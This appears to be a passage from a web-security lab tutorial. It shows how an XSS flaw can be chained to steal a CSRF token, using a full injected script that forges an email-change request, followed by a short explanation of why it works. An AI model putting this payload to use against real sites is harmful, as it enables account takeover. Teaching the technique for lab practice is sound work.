Attack 4: XSS + CSRF Combo

If you find an XSS vulnerability, you can use it to steal CSRF tokens:

<script>
  fetch('/vulns/csrf')
    .then(r => r.text())
    .then(html => {
      let token = html.match(/name="csrf_token" value="([^"]+)"/);
      if (token) {
        // Now you have the token, forge any request
        fetch('/vulns/csrf', {
          method: 'POST',
          body: `action=change_email&email=hacked@evil.com&csrf_token=${token[1]}`
        });
      }
    });
</script>
Why This Works
  • Browser sends cookies automatically with every request
  • The server sees a valid session cookie
  • If no CSRF token check, the request is trusted
  • SameSite cookies help but don't prevent all attacks
